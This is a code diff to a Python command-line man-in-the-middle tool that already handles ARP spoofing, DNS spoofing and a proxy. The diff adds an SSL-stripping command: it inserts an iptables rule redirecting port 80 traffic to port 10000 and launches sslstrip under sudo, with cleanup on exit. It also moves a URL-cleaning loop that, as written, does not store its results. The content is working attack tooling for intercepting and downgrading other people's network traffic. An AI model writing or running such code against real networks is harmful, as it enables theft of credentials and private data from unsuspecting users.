@@ -4,6 +4,7 @@ import sys
 
 import argparse
 import threading
+import subprocess
 import atexit
 
 import arp_spoofing
@@ -87,17 +88,25 @@ class SpoofToolCLI(cmd.Cmd):
         
         if args.manual:
             print("Manual URL addresses: {}.".format(', '.join(args.manual)))
+            for url in args.manual:
+                url = url.replace("http://", "").replace("https://", "").replace("www.", "")
         if args.iface:
             print("Network interface: {}".format(args.iface))
 
         print("DNS spoofing started")
-        
-        for url in args.manual:
-            url = url.replace("http://", "").replace("https://", "").replace("www.", "")
+    
         dns_spoofing.urls = args.manual
         dns_spoofing.IFACE = args.iface
         proxy.setup_proxy()
-        pass
+        return
+
+    ssl_process = None
+    def do_ssl_strip(self, line):
+        """Turns on ssl stripping (using moxie ssl_strip). Run ARP First."""
+        os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
+        global ssl_process
+        ssl_process = subprocess.Popen("sudo sslstrip-package/sslstrip.py", shell=True)
+        return
 
 
     def do_clear(self, line):
@@ -112,8 +121,6 @@ class SpoofToolCLI(cmd.Cmd):
     
     def do_exit(self, line):
         """Quit the program."""
-        arp_spoofing = False
-        dns_spoofing = False
         print("Goodbye!")
         return True
 
@@ -168,6 +175,10 @@ def exit_handler():
         proxy.undo_iptables()
         if proxy.nfqueue is not None:
             proxy.nfqueue.unbind()
+
+        if ssl_process is not None:
+            ssl_process.terminate()
+
         exit()
 
 if __name__ == '__main__':
